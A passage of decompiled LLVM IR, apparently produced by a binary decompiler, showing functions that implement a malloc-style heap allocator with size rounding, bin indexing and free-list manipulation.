  store i32 %v2_8051e1c, i32* @edx, align 4
  br i1 %v2_8051e19, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051e08
  %v5_8051e1f = shl i32 1, %v1_8051e19
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051e08, %bb
  %v6_8051e21 = phi i32 [ 1, %dec_label_pc_8051e08 ], [ %v5_8051e1f, %bb ]
  %v2_8051e21 = mul nuw nsw i32 %v2_8051e1c, 4
  %v3_8051e21 = add i32 %v2_8051e21, %arg1
  %v4_8051e21 = inttoptr i32 %v3_8051e21 to i32*
  %v5_8051e21 = load i32, i32* %v4_8051e21, align 4
  %v7_8051e21 = or i32 %v5_8051e21, %v6_8051e21
  store i32 %v7_8051e21, i32* %v4_8051e21, align 4
  %v2_8051e26 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051e26, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8051e1c, { 1, 0 }
  uselistorder i32 %v1_8051e19, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8051e28() local_unnamed_addr {
dec_label_pc_8051e28:
  %v0_8051e28 = load i32, i32* @eax, align 4
  %v6_8051e3b = icmp ugt i32 %v0_8051e28, 16777215
  br i1 %v6_8051e3b, label %dec_label_pc_8051e4c, label %dec_label_pc_8051e3d

dec_label_pc_8051e3d:                             ; preds = %dec_label_pc_8051e28
  %v2_8051e2b = udiv i32 %v0_8051e28, 256
  %tmp = icmp ult i32 %v0_8051e28, 256
  %v2_8051e3d = call i32 @llvm.ctlz.i32(i32 %v2_8051e2b, i1 true)
  %v3_8051e3d = xor i32 %v2_8051e3d, 31
  %v5_8051e3d = select i1 %tmp, i32 95, i32 %v3_8051e3d
  %v1_8051e40 = add nuw nsw i32 %v5_8051e3d, 6
  %v2_8051e43 = urem i32 %v1_8051e40, 32
  %v4_8051e43 = icmp eq i32 %v2_8051e43, 0
  br i1 %v4_8051e43, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8051e3d
  %v5_8051e43 = lshr i32 %v0_8051e28, %v2_8051e43
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8051e3d, %bb
  %v0_8051e45 = phi i32 [ %v0_8051e28, %dec_label_pc_8051e3d ], [ %v5_8051e43, %bb ]
  %v1_8051e45 = urem i32 %v0_8051e45, 4
  %v2_8051e48 = mul nuw nsw i32 %v5_8051e3d, 4
  %v3_8051e48 = or i32 %v1_8051e45, 32
  %v4_8051e48 = add nuw nsw i32 %v3_8051e48, %v2_8051e48
  br label %dec_label_pc_8051e4c

dec_label_pc_8051e4c:                             ; preds = %dec_label_pc_8051e28, %bb4
  %v0_8051e4d = phi i32 [ 95, %dec_label_pc_8051e28 ], [ %v4_8051e48, %bb4 ]
  ret i32 %v0_8051e4d

; uselistorder directives
  uselistorder i32 %v2_8051e43, { 1, 0 }
  uselistorder i32 %v0_8051e28, { 2, 3, 0, 1, 4 }
  uselistorder i1 true, { 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %dec_label_pc_8051e4c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8051e4e(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051e4e:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051e4e = load i32, i32* @ebp, align 4
  %v0_8051e4f = load i32, i32* @edi, align 4
  %v0_8051e50 = load i32, i32* @esi, align 4
  %v0_8051e51 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e51, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8051e63 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051e63, i32* @eax, align 4
  store i32 %v2_8051e63, i32* %stack_var_-92, align 4
  %v2_8051e68 = call i32 @function_805337a(i32 %v2_8051e63, i32 134558583)
  store i32 %v2_8051e68, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80555dc.32 to i32), i32* %stack_var_-92, align 4
  %v1_8051e74 = call i32 @function_8053377(i32 ptrtoint (i32* @global_var_80555dc.32 to i32))
  store i32 %v1_8051e74, i32* %eax.global-to-local, align 4
  %v0_8051e7c = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_8051e7c, -32
  br i1 %tmp123, label %dec_label_pc_8051e93, label %dec_label_pc_8051e81

dec_label_pc_8051e81:                             ; preds = %dec_label_pc_8051e4e
  %v0_8051e81 = load i32, i32* %stack_var_-92, align 4
  %v1_8051e81 = call i32 @function_8051a1b(i32 %v0_8051e81)
  store i32 %v1_8051e81, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8051e88 = inttoptr i32 %v1_8051e81 to i32*
  store i32 12, i32* %v1_8051e88, align 4
  br label %dec_label_pc_80525b8

dec_label_pc_8051e93:                             ; preds = %dec_label_pc_8051e4e
  %v1_8051e93 = add i32 %v0_8051e7c, 11
  %tmp124 = icmp ult i32 %v1_8051e93, 16
  %v1_8051ea3 = and i32 %v1_8051e93, -8
  %v1_8051e93.v1_8051ea3 = select i1 %tmp124, i32 %v1_8051e93, i32 %v1_8051ea3
  %.v1_8051ea3 = select i1 %tmp124, i32 16, i32 %v1_8051ea3
  store i32 %v1_8051e93.v1_8051ea3, i32* %eax.global-to-local, align 4
  %v0_8051eaa = load i8, i8* @global_var_80558c0.33, align 1
  %v1_8051eaa = sext i8 %v0_8051eaa to i32
  store i32 %v1_8051eaa, i32* @ebx, align 4
  %v3_8051eb0 = urem i8 %v0_8051eaa, 2
  %v4_8051eb0 = icmp eq i8 %v3_8051eb0, 0
  %v1_8051eb3 = icmp eq i1 %v4_8051eb0, false
  br i1 %v1_8051eb3, label %dec_label_pc_8051ed2, label %dec_label_pc_8051eb5

dec_label_pc_8051eb5:                             ; preds = %dec_label_pc_8051e93
  %v2_8051eb5 = icmp eq i8 %v0_8051eaa, 0
  %v1_8051eb7 = icmp eq i1 %v2_8051eb5, false
  br i1 %v1_8051eb7, label %dec_label_pc_80521ad, label %dec_label_pc_8051ebd

dec_label_pc_8051ebd:                             ; preds = %dec_label_pc_8051eb5
  store i32 ptrtoint (i8* @global_var_80558c0.33 to i32), i32* %stack_var_-92, align 4
  %v2_8051ec5 = call i32 @function_8052a6b(i32* bitcast (i8* @global_var_80558c0.33 to i32*))
  store i32 %v2_8051ec5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80521ad

dec_label_pc_8051ed2:                             ; preds = %dec_label_pc_8051e93
  %v11_8051ed2 = trunc i32 %.v1_8051ea3 to i8
  %v8_8051ed6 = icmp ugt i8 %v11_8051ed2, %v0_8051eaa
  br i1 %v8_8051ed6, label %dec_label_pc_8051ef3, label %dec_label_pc_8051ed8

dec_label_pc_8051ed8:                             ; preds = %dec_label_pc_8051ed2
  %v2_8051edc = udiv i32 %.v1_8051ea3, 2
  store i32 %v2_8051edc, i32* %eax.global-to-local, align 4
  %v1_8051ede = add i32 %v2_8051edc, ptrtoint (i8* @global_var_80558c0.33 to i32)
  store i32 %v1_8051ede, i32* %ecx.global-to-local, align 4
  %v1_8051ee4 = add i32 %v2_8051edc, add (i32 ptrtoint (i8* @global_var_80558c0.33 to i32), i32 -4)
  %v2_8051ee4 = inttoptr i32 %v1_8051ee4 to i32*
  %v3_8051ee4 = load i32, i32* %v2_8051ee4, align 4
  store i32 %v3_8051ee4, i32* @edx, align 4
  %v1_8051ee7 = icmp eq i32 %v3_8051ee4, 0
  br i1 %v1_8051ee7, label %dec_label_pc_8051ef3, label %dec_label_pc_8051eeb

dec_label_pc_8051eeb:                             ; preds = %dec_label_pc_8051ed8
  %v1_8051eeb = add i32 %v3_8051ee4, 8
  %v2_8051eeb = inttoptr i32 %v1_8051eeb to i32*
  %v3_8051eeb = load i32, i32* %v2_8051eeb, align 4
  store i32 %v3_8051eeb, i32* %eax.global-to-local, align 4
  store i32 %v3_8051eeb, i32* %v2_8051ee4, align 4
  br label %dec_label_pc_8051f2c

dec_label_pc_8051ef3:                             ; preds = %dec_label_pc_8051ed8, %dec_label_pc_8051ed2
  %v8_8051ef3 = icmp ult i32 %.v1_8051ea3, 255
  %v6_8051efb = icmp ugt i32 %.v1_8051ea3, 255
  store i32 %.v1_8051ea3, i32* @eax, align 4
  br i1 %v6_8051efb, label %dec_label_pc_8051f34, label %dec_label_pc_8051efd

dec_label_pc_8051efd:                             ; preds = %dec_label_pc_8051ef3
  %v2_8051f01 = udiv i32 %.v1_8051ea3, 8
  store i32 %v2_8051f01, i32* %eax.global-to-local, align 4
  %v1_8051f08 = mul nuw i32 %v2_8051f01, 8
  %v2_8051f08 = add i32 %v1_8051f08, ptrtoint (i32* @global_var_80558ec.34 to i32)
  store i32 %v2_8051f08, i32* %ecx.global-to-local, align 4
  %v1_8051f0f = add i32 %v1_8051f08, add (i32 ptrtoint (i32* @global_var_80558ec.34 to i32), i32 12)
  %v2_8051f0f = inttoptr i32 %v1_8051f0f to i32*
  %v3_8051f0f = load i32, i32* %v2_8051f0f, align 4
  store i32 %v3_8051f0f, i32* @edx, align 4
  %v12_8051f12 = icmp eq i32 %v3_8051f0f, %v2_8051f08
  br i1 %v12_8051f12, label %dec_label_pc_8052030.preheader, label %dec_label_pc_8051f1a

dec_label_pc_8051f1a:                             ; preds = %dec_label_pc_8051efd
  store i32 %.v1_8051ea3, i32* %ebx.global-to-local, align 4
  %v1_8051f1e = add i32 %v3_8051f0f, 12
  %v2_8051f1e = inttoptr i32 %v1_8051f1e to i32*
  %v3_8051f1e = load i32, i32* %v2_8051f1e, align 4
  store i32 %v3_8051f1e, i32* %eax.global-to-local, align 4
  store i32 %v3_8051f1e, i32* %v2_8051f0f, align 4
  %v0_8051f24 = load i32, i32* @edx, align 4
  %v1_8051f24 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051f24 = add i32 %v0_8051f24, 4
  %v3_8051f24 = add i32 %v2_8051f24, %v1_8051f24
  %v4_8051f24 = inttoptr i32 %v3_8051f24 to i32*
  %v5_8051f24 = load i32, i32* %v4_8051f24, align 4
  %v6_8051f24 = or i32 %v5_8051f24, 1
  store i32 %v6_8051f24, i32* %v4_8051f24, align 4
  %v0_8051f29 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051f29 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051f29 = add i32 %v1_8051f29, 8
  %v3_8051f29 = inttoptr i32 %v2_8051f29 to i32*
  store i32 %v0_8051f29, i32* %v3_8051f29, align 4
  br label %dec_label_pc_8051f2c

dec_label_pc_8051f2c:                             ; preds = %dec_label_pc_80522c9, %dec_label_pc_80522db, %dec_label_pc_8051eeb, %dec_label_pc_8051f1a
  %v0_8051f2c = load i32, i32* @edx, align 4
  %v1_8051f2c = add i32 %v0_8051f2c, 8
  store i32 %v1_8051f2c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525a7

dec_label_pc_8051f34:                             ; preds = %dec_label_pc_8051ef3
  %v0_8051f38 = call i32 @function_8051e28()
  store i32 %v0_8051f38, i32* %eax.global-to-local, align 4
  %v3_8051f3d = and i8 %v0_8051eaa, 2
  %v4_8051f3d = icmp eq i8 %v3_8051f3d, 0
  %v6_8051f3d = zext i8 %v3_8051f3d to i32
  %v9_8051f3d = and i32 %v1_8051eaa, -256
  %v10_8051f3d = or i32 %v9_8051f3d, %v6_8051f3d
  store i32 %v10_8051f3d, i32* @ebx, align 4
  br i1 %v4_8051f3d, label %dec_label_pc_8052030.preheader, label %dec_label_pc_8051f4a

dec_label_pc_8051f4a:                             ; preds = %dec_label_pc_8051f34
  store i32 ptrtoint (i8* @global_var_80558c0.33 to i32), i32* %stack_var_-92, align 4
  %v2_8051f52 = call i32 @function_8052a6b(i32* bitcast (i8* @global_var_80558c0.33 to i32*))
  store i32 %v2_8051f52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052030.preheader

dec_label_pc_8052030.preheader:                   ; preds = %dec_label_pc_8051f4a, %dec_label_pc_8051efd, %dec_label_pc_8051f34
  %stack_var_-40.0.ph = phi i32 [ %v2_8051f01, %dec_label_pc_8051efd ], [ %v0_8051f38, %dec_label_pc_8051f4a ], [ %v0_8051f38, %dec_label_pc_8051f34 ]
  %v0_80520309 = load i32, i32* @global_var_8055900.37, align 256
  store i32 %v0_80520309, i32* @ebp, align 4
  %v9_805203615 = icmp eq i32 %v0_80520309, 134568180
  %v1_805203c17 = icmp eq i1 %v9_805203615, false
  br i1 %v1_805203c17, label %dec_label_pc_8051f5f.lr.ph, label %dec_label_pc_8052042

dec_label_pc_8051f5f.lr.ph:                       ; preds = %dec_label_pc_8052030.preheader
  %v1_8051f86 = add i32 %.v1_8051ea3, 16
  br label %dec_label_pc_8051f5f

dec_label_pc_8051f5f:                             ; preds = %dec_label_pc_8051f5f.lr.ph, %dec_label_pc_8052030
  %v1_8052559 = phi i32 [ %v0_80520309, %dec_label_pc_8051f5f.lr.ph ], [ %v0_8052030, %dec_label_pc_8052030 ]
  %v1_8051f5f = add i32 %v1_8052559, 4
  %v2_8051f5f = inttoptr i32 %v1_8051f5f to i32*
  %v3_8051f5f = load i32, i32* %v2_8051f5f, align 4
  %v1_8051f62 = add i32 %v1_8052559, 12
  %v2_8051f62 = inttoptr i32 %v1_8051f62 to i32*
  %v3_8051f62 = load i32, i32* %v2_8051f62, align 4
  store i32 %v3_8051f62, i32* @edx, align 4
  %v1_8051f65 = and i32 %v3_8051f5f, -4
  store i32 %v1_8051f65, i32* @edi, align 4
  %v9_8051f72 = icmp eq i32 %v3_8051f62, 134568180
  %v1_8051f78 = icmp eq i1 %v9_8051f72, false
  %or.cond95 = or i1 %v6_8051efb, %v1_8051f78
  br i1 %or.cond95, label %dec_label_pc_8051f91, label %dec_label_pc_8051f7a

dec_label_pc_8051f7a:                             ; preds = %dec_label_pc_8051f5f
  %v1_8051f7a = load i32, i32* @global_var_80558f0.35, align 16
  %v12_8051f7a = icmp eq i32 %v1_8052559, %v1_8051f7a
  %v1_8051f80 = icmp eq i1 %v12_8051f7a, false
  br i1 %v1_8051f80, label %dec_label_pc_8051f91, label %dec_label_pc_8051f82

dec_label_pc_8051f82:                             ; preds = %dec_label_pc_8051f7a
  store i32 %v1_8051f86, i32* %eax.global-to-local, align 4
  %v6_8051f8b = icmp ugt i32 %v1_8051f65, %v1_8051f86
  br i1 %v6_8051f8b, label %dec_label_pc_8052542, label %dec_label_pc_8051f91

dec_label_pc_8051f91:                             ; preds = %dec_label_pc_8051f82, %dec_label_pc_8051f7a, %dec_label_pc_8051f5f
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %eax.global-to-local, align 4
  %v2_8051f96 = add i32 %v3_8051f62, 8
  %v3_8051f96 = inttoptr i32 %v2_8051f96 to i32*
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %v3_8051f96, align 4
  %v0_8051f99 = load i32, i32* @edx, align 4
  store i32 %v0_8051f99, i32* @global_var_8055900.37, align 4
  %v0_8051f9c = load i32, i32* @edi, align 4
  %v15_8051f9c = icmp eq i32 %v0_8051f9c, %.v1_8051ea3
  br i1 %v15_8051f9c, label %dec_label_pc_8052583, label %dec_label_pc_8051fa6

dec_label_pc_8051fa6:                             ; preds = %dec_label_pc_8051f91
  %v6_8051fac = icmp ugt i32 %v0_8051f9c, 255
  br i1 %v6_8051fac, label %dec_label_pc_8051fbf, label %dec_label_pc_8051fae

dec_label_pc_8051fae:                             ; preds = %dec_label_pc_8051fa6
  %v2_8051fb0 = udiv i32 %v0_8051f9c, 8
  store i32 %v2_8051fb0, i32* %esi.global-to-local, align 4
  %v1_8051fb3 = mul nuw i32 %v2_8051fb0, 8
  %v2_8051fb3 = add i32 %v1_8051fb3, 134568172
  store i32 %v2_8051fb3, i32* @ebx, align 4
  %v1_8051fba = add i32 %v1_8051fb3, 134568180
  %v2_8051fba = inttoptr i32 %v1_8051fba to i32*
  %v3_8051fba = load i32, i32* %v2_8051fba, align 4
  store i32 %v3_8051fba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052008

dec_label_pc_8051fbf:                             ; preds = %dec_label_pc_8051fa6
  store i32 %v0_8051f9c, i32* @eax, align 4
  %v0_8051fc1 = call i32 @function_8051e28()
  store i32 %v0_8051fc1, i32* %esi.global-to-local, align 4
  %v1_8051fc8 = mul i32 %v0_8051fc1, 8
  %v2_8051fc8 = add i32 %v1_8051fc8, ptrtoint (i32* @global_var_80558ec.34 to i32)
  store i32 %v2_8051fc8, i32* %eax.global-to-local, align 4
  %v1_8051fcf = add i32 %v1_8051fc8, add (i32 ptrtoint (i32* @global_var_80558ec.34 to i32), i32 8)
  %v2_8051fcf = inttoptr i32 %v1_8051fcf to i32*
  %v3_8051fcf = load i32, i32* %v2_8051fcf, align 4
  store i32 %v3_8051fcf, i32* %edx.global-to-local, align 4
  store i32 %v3_8051fcf, i32* @ebx, align 4
  %v12_8051fd8 = icmp eq i32 %v3_8051fcf, %v2_8051fc8
  br i1 %v12_8051fd8, label %dec_label_pc_8052008, label %dec_label_pc_8051fdc

dec_label_pc_8051fdc:                             ; preds = %dec_label_pc_8051fbf
  %v1_8051fdc = add i32 %v1_8051fc8, add (i32 ptrtoint (i32* @global_var_80558ec.34 to i32), i32 12)
  %v2_8051fdc = inttoptr i32 %v1_8051fdc to i32*
  %v3_8051fdc = load i32, i32* %v2_8051fdc, align 4
  store i32 %v3_8051fdc, i32* @ebx, align 4
  %v0_8051fdf = load i32, i32* @edi, align 4
  %v2_8051fdf = add i32 %v3_8051fdc, 4
  %v3_8051fdf = inttoptr i32 %v2_8051fdf to i32*
  %v4_8051fdf = load i32, i32* %v3_8051fdf, align 4
  %v10_8051fdf = icmp ult i32 %v0_8051fdf, %v4_8051fdf
  %v1_8051fe2 = icmp eq i1 %v10_8051fdf, false
  br i1 %v1_8051fe2, label %dec_label_pc_8051fea, label %dec_label_pc_8052008

dec_label_pc_8051fea:                             ; preds = %dec_label_pc_8051fdc
  %v1_8051fec = or i32 %v0_8051fdf, 1
  store i32 %v1_8051fec, i32* %eax.global-to-local, align 4
  store i32 %v3_8051fcf, i32* %ebx.global-to-local, align 4
  %v2_8052000109 = add i32 %v3_8051fcf, 4
  %v3_8052000110 = inttoptr i32 %v2_8052000109 to i32*
  %v4_8052000111 = load i32, i32* %v3_8052000110, align 4
  %v10_8052000112 = icmp ult i32 %v1_8051fec, %v4_8052000111
  br i1 %v10_8052000112, label %dec_label_pc_8051ff1, label %dec_label_pc_8052005

dec_label_pc_8051ff1:                             ; preds = %dec_label_pc_8051fea, %dec_label_pc_8051ff1
  %v0_8052005113 = phi i32 [ %v3_8051ff5, %dec_label_pc_8051ff1 ], [ %v3_8051fcf, %dec_label_pc_8051fea ]
  store i32 %v0_8052005113, i32* %ecx.global-to-local, align 4
  %v1_8051ff5 = add i32 %v0_8052005113, 8
  %v2_8051ff5 = inttoptr i32 %v1_8051ff5 to i32*
  %v3_8051ff5 = load i32, i32* %v2_8051ff5, align 4
  store i32 %v3_8051ff5, i32* %ecx.global-to-local, align 4
  store i32 %v3_8051ff5, i32* %ebx.global-to-local, align 4
  %v2_8052000 = add i32 %v3_8051ff5, 4
  %v3_8052000 = inttoptr i32 %v2_8052000 to i32*
  %v4_8052000 = load i32, i32* %v3_8052000, align 4
  %v10_8052000 = icmp ult i32 %v1_8051fec, %v4_8052000
  br i1 %v10_8052000, label %dec_label_pc_8051ff1, label %dec_label_pc_8052005

dec_label_pc_8052005:                             ; preds = %dec_label_pc_8051ff1, %dec_label_pc_8051fea
  %v0_8052005.lcssa = phi i32 [ %v3_8051fcf, %dec_label_pc_8051fea ], [ %v3_8051ff5, %dec_label_pc_8051ff1 ]
  %v1_8052005 = add i32 %v0_8052005.lcssa, 12
  %v2_8052005 = inttoptr i32 %v1_8052005 to i32*
  %v3_8052005 = load i32, i32* %v2_8052005, align 4
  store i32 %v3_8052005, i32* @ebx, align 4
  br label %dec_label_pc_8052008

dec_label_pc_8052008:                             ; preds = %dec_label_pc_8051fae, %dec_label_pc_8051fdc, %dec_label_pc_8051fbf, %dec_label_pc_8052005
  %v0_8052008 = phi i32 [ %v0_8051fc1, %dec_label_pc_8051fbf ], [ %v0_8051fc1, %dec_label_pc_8052005 ], [ %v0_8051fc1, %dec_label_pc_8051fdc ], [ %v2_8051fb0, %dec_label_pc_8051fae ]
  %stack_var_-64.1 = phi i32 [ %v2_8051fc8, %dec_label_pc_8051fbf ], [ %v0_8052005.lcssa, %dec_label_pc_8052005 ], [ %v2_8051fc8, %dec_label_pc_8051fdc ], [ %v3_8051fba, %dec_label_pc_8051fae ]
  %v1_805200a = urem i32 %v0_8052008, 32
  %v2_805200a = icmp eq i32 %v1_805200a, 0
  store i32 %v1_805200a, i32* %esi.global-to-local, align 4
  store i32 %v1_805200a, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052014 = sdiv i32 %v0_8052008, 32
  store i32 %v2_8052014, i32* %edx.global-to-local, align 4
  br i1 %v2_805200a, label %dec_label_pc_8052030, label %bb

bb:                                               ; preds = %dec_label_pc_8052008
  %v5_8052017 = shl i32 1, %v1_805200a
  store i32 %v5_8052017, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052030

dec_label_pc_8052030:                             ; preds = %dec_label_pc_8052008, %bb
  %v5_8052019 = phi i32 [ 1, %dec_label_pc_8052008 ], [ %v5_8052017, %bb ]
  %v1_8052019 = mul nsw i32 %v2_8052014, 4
  %v2_8052019 = add i32 %v1_8052019, ptrtoint (i32* @global_var_8055bf4.38 to i32)
  %v3_8052019 = inttoptr i32 %v2_8052019 to i32*
  %v4_8052019 = load i32, i32* %v3_8052019, align 4
  %v6_8052019 = or i32 %v4_8052019, %v5_8052019
  store i32 %v6_8052019, i32* %v3_8052019, align 4
  %v0_8052020 = load i32, i32* @ebx, align 4
  %v1_8052020 = load i32, i32* @ebp, align 4
  %v2_8052020 = add i32 %v1_8052020, 12
  %v3_8052020 = inttoptr i32 %v2_8052020 to i32*
  store i32 %v0_8052020, i32* %v3_8052020, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052027 = load i32, i32* @ebp, align 4
  %v2_8052027 = add i32 %v1_8052027, 8
  %v3_8052027 = inttoptr i32 %v2_8052027 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052027, align 4
  %v0_805202a = load i32, i32* @ebp, align 4
  %v1_805202a = load i32, i32* @ebx, align 4
  %v2_805202a = add i32 %v1_805202a, 8
  %v3_805202a = inttoptr i32 %v2_805202a to i32*
  store i32 %v0_805202a, i32* %v3_805202a, align 4
  %v0_805202d = load i32, i32* @ebp, align 4
  %v1_805202d = load i32, i32* @esi, align 4
  %v2_805202d = add i32 %v1_805202d, 12
  %v3_805202d = inttoptr i32 %v2_805202d to i32*
  store i32 %v0_805202d, i32* %v3_805202d, align 4
  %v0_8052030 = load i32, i32* @global_var_8055900.37, align 256
  store i32 %v0_8052030, i32* @ebp, align 4
  %v9_8052036 = icmp eq i32 %v0_8052030, 134568180
  %v1_805203c = icmp eq i1 %v9_8052036, false
  br i1 %v1_805203c, label %dec_label_pc_8051f5f, label %dec_label_pc_8052042

dec_label_pc_8052042:                             ; preds = %dec_label_pc_8052030, %dec_label_pc_8052030.preheader
  br i1 %v8_8051ef3, label %dec_label_pc_80520d0, label %dec_label_pc_8052050

dec_label_pc_8052050:                             ; preds = %dec_label_pc_8052042
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052054 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052054 = add i32 %v1_8052054, ptrtoint (i32* @global_var_80558ec.34 to i32)
  store i32 %v2_8052054, i32* %edx.global-to-local, align 4
  %v1_805205b = add i32 %v1_8052054, add (i32 ptrtoint (i32* @global_var_80558ec.34 to i32), i32 12)
  %v2_805205b = inttoptr i32 %v1_805205b to i32*
  %storemerge1.pre = load i32, i32* %v2_805205b, align 4
  br label %dec_label_pc_80520cc

dec_label_pc_8052060:                             ; preds = %dec_label_pc_80520cc
  %v1_8052060 = add i32 %v4_8052077, 4
  %v2_8052060 = inttoptr i32 %v1_8052060 to i32*
  %v3_8052060 = load i32, i32* %v2_8052060, align 4
  store i32 %v3_8052060, i32* %ebx.global-to-local, align 4
  %v1_8052063 = add i32 %v4_8052077, 12
  %v2_8052063 = inttoptr i32 %v1_8052063 to i32*
  %v3_8052063 = load i32, i32* %v2_8052063, align 4
  store i32 %v3_8052063, i32* @ecx, align 4
  %v1_8052066 = and i32 %v3_8052060, -4
  store i32 %v1_8052066, i32* @ebx, align 4
  %v10_8052069 = icmp ult i32 %v1_8052066, %.v1_8051ea3
  br i1 %v10_8052069, label %dec_label_pc_80520cc, label %dec_label_pc_805206f

dec_label_pc_805206f:                             ; preds = %dec_label_pc_8052060
  %v1_805206f = add i32 %v4_8052077, 8
  %v2_805206f = inttoptr i32 %v1_805206f to i32*
  %v3_805206f = load i32, i32* %v2_805206f, align 4
  store i32 %v3_805206f, i32* @edx, align 4
  %v1_8052072 = add i32 %v3_805206f, 12
  %v2_8052072 = inttoptr i32 %v1_8052072 to i32*
  %v3_8052072 = load i32, i32* %v2_8052072, align 4
  %v15_8052072 = icmp eq i32 %v3_8052072, %v4_8052077
  %v1_8052075 = icmp eq i1 %v15_8052072, false
  br i1 %v1_8052075, label %dec_label_pc_805207c, label %dec_label_pc_8052077

dec_label_pc_8052077:                             ; preds = %dec_label_pc_805206f
  %v1_8052077 = add i32 %v3_8052063, 8
  %v2_8052077 = inttoptr i32 %v1_8052077 to i32*
  %v3_8052077 = load i32, i32* %v2_8052077, align 4
  %v15_8052077 = icmp eq i32 %v3_8052077, %v4_8052077
  br i1 %v15_8052077, label %dec_label_pc_8052081, label %dec_label_pc_805207c

dec_label_pc_805207c:                             ; preds = %dec_label_pc_8052077, %dec_label_pc_805206f
  %v0_805207c = call i32 @function_8052daf()
  store i32 %v0_805207c, i32* %eax.global-to-local, align 4
  %v0_8052081.pre = load i32, i32* @ebx, align 4
  %v0_8052087.pre = load i32, i32* @ecx, align 4
  %v1_8052087.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052081

dec_label_pc_8052081:                             ; preds = %dec_label_pc_8052077, %dec_label_pc_805207c
  %v1_8052087 = phi i32 [ %v3_805206f, %dec_label_pc_8052077 ], [ %v1_8052087.pre, %dec_label_pc_805207c ]
  %v0_8052087 = phi i32 [ %v3_8052063, %dec_label_pc_8052077 ], [ %v0_8052087.pre, %dec_label_pc_805207c ]
  %v0_8052081 = phi i32 [ %v1_8052066, %dec_label_pc_8052077 ], [ %v0_8052081.pre, %dec_label_pc_805207c ]
  %v5_8052083 = sub i32 %v0_8052081, %.v1_8051ea3
  store i32 %v5_8052083, i32* %esi.global-to-local, align 4
  %v2_8052087 = add i32 %v1_8052087, 12
  %v3_8052087 = inttoptr i32 %v2_8052087 to i32*
  store i32 %v0_8052087, i32* %v3_8052087, align 4
  %v0_805208a = load i32, i32* @edx, align 4
  %v1_805208a = load i32, i32* @ecx, align 4
  %v2_805208a = add i32 %v1_805208a, 8
  %v3_805208a = inttoptr i32 %v2_805208a to i32*
  store i32 %v0_805208a, i32* %v3_805208a, align 4
  %v0_805208d = load i32, i32* %esi.global-to-local, align 4
  %v0_8052090 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052090 = add i32 %v0_8052090, 8
  store i32 %v1_8052090, i32* %ecx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_805208d, 16
  br i1 %tmp125, label %dec_label_pc_8052591, label %dec_label_pc_8052099

dec_label_pc_8052099:                             ; preds = %dec_label_pc_8052081
  %v2_805209d = add i32 %v0_8052090, %.v1_8051ea3
  store i32 %v2_805209d, i32* @edx, align 4
  %v1_80520a0 = or i32 %.v1_8051ea3, 1
  store i32 %v1_80520a0, i32* %ebx.global-to-local, align 4
  %v2_80520a3 = add i32 %v0_8052090, 4
  %v3_80520a3 = inttoptr i32 %v2_80520a3 to i32*
  store i32 %v1_80520a0, i32* %v3_80520a3, align 4
  %v0_80520a6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80520a8 = or i32 %v0_80520a6, 1
  store i32 %v1_80520a8, i32* %eax.global-to-local, align 4
  %v0_80520ab = load i32, i32* @edx, align 4
  %v1_80520ab = load i32, i32* @ebp, align 4
  %v2_80520ab = add i32 %v1_80520ab, 8
  %v3_80520ab = inttoptr i32 %v2_80520ab to i32*
  store i32 %v0_80520ab, i32* %v3_80520ab, align 4
  %v0_80520ae = load i32, i32* @edx, align 4
  %v1_80520ae = load i32, i32* @ebp, align 4
  %v2_80520ae = add i32 %v1_80520ae, 12
  %v3_80520ae = inttoptr i32 %v2_80520ae to i32*
  store i32 %v0_80520ae, i32* %v3_80520ae, align 4
  %v0_80520b1 = load i32, i32* @edx, align 4
  %v1_80520b1 = add i32 %v0_80520b1, 8
  %v2_80520b1 = inttoptr i32 %v1_80520b1 to i32*
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %v2_80520b1, align 4
  %v0_80520b8 = load i32, i32* @edx, align 4
  %v1_80520b8 = add i32 %v0_80520b8, 12
  %v2_80520b8 = inttoptr i32 %v1_80520b8 to i32*
  store i32 ptrtoint (i32* @global_var_80558f4.36 to i32), i32* %v2_80520b8, align 4
